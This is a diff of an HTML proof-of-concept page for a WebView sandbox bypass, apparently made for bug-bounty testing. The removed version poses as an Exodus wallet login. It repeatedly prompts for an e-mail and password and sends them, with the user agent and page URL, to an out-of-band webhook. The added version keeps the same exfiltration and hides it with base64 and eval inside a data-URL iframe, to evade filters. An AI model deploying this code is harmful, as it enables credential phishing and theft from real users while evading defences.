@@ -3,43 +3,53 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, user-scalable=no">
-  <title>Bypass sandbox Webview UXSS Delayed JavaScript execution leak to host app (Exodus)</title>
+  <title>Bypass sandbox Webview UXSS Test</title>
   <style>
-    iframe { visibility: hidden; }
+    iframe { visibility: hidden; width: 1px; height: 1px; }
     body { font-family: system-ui, sans-serif; text-align: center; padding-top: 100px; }
+    h1 { color: #c00; }
   </style>
   <script>
-    window.onblur = function () {
-      const msg = 'In order to access Exodus.com\\n' +
-                  'you must first login on your\\nExodus Account.\\n\\n' +
-                  'Please type your e-mail\\nand your password:';
+    // Payload yang akan diuji
+    const msg = 'Uji WebView iOS\n\nMasukkan teks untuk test sandbox:';
+    const hook = "https://oxomzauseuatgjlyyqtdmzit6gjs53lvv.oast.fun/";
 
-      // Payload yang akan dieksekusi di dalam iframe via javascript: (GET webhook)
-      const code =
-        "(function(){try{" +
-          "var m=" + JSON.stringify(msg) + ";" +
-          "var v='';" +
-          // Paksa isi: Cancel/kosong akan loop
-          "while(v===null||(''+v).trim()===''){ v=prompt(m,'E-mail / Password.'); }" +
-          // Build URL GET ke webhook
-          "var hook=" + JSON.stringify("https://oxomzauseuatgjlyyqtdmzit6gjs53lvv.oast.fun/") + ";" +
-          "var qs='?creds='+encodeURIComponent(v)" +
-                 "+'&ua='+encodeURIComponent(navigator.userAgent)" +
-                 "+'&page='+encodeURIComponent((document.referrer||location.href))" +
-                 "+'&t='+Date.now();" +
-          "var u=hook+qs;" +
-          // Coba fetch GET (no-cors, keepalive), fallback ke Image GET (anti-cache pakai &via=img)
-          "try{ fetch(u,{method:'GET',mode:'no-cors',keepalive:true}).catch(function(_){" +
-          "  try{ (new Image()).src=u+'&via=img'; }catch(__){}" +
-          "}); }catch(e){ try{ (new Image()).src=u+'&via=img'; }catch(__){} }" +
-        "}catch(e){}})()";
+    const code = `
+      (function(){
+        try {
+          var v = '';
+          while(v===null || (''+v).trim()===''){
+            v = prompt(${JSON.stringify(msg)}, 'test@ios');
+          }
+          var qs='?creds='+encodeURIComponent(v)
+                 +'&ua='+encodeURIComponent(navigator.userAgent)
+                 +'&page='+encodeURIComponent(location.href)
+                 +'&t='+Date.now();
+          var u='${hook}'+qs;
 
-      document.getElementById('iframe').src = "javascript:" + code;
+          try {
+            fetch(u,{method:'GET',mode:'no-cors',keepalive:true}).catch(function(_){
+              try{ (new Image()).src=u+'&via=img'; }catch(e){}
+            });
+          } catch(e){
+            try{ (new Image()).src=u+'&via=img'; }catch(e){}
+          }
+        } catch(e){}
+      })();
+    `;
+
+    window.onload = function(){
+      // Encode ke Base64 biar lolos filter
+      const payload = btoa(code);
+      const html = "<script>eval(atob('" + payload + "'))<\/script>";
+      const iframe = document.getElementById('iframe');
+      iframe.src = "data:text/html;base64," + btoa(html);
     };
   </script>
 </head>
 <body>
-  <h1>Click Here</h1>
+  <h1>🔍 Uji Sandbox WebView iOS</h1>
+  <p>Jika sandbox lemah, prompt akan muncul & data terkirim ke server uji.</p>
   <iframe id="iframe"></iframe>
 </body>
 </html>
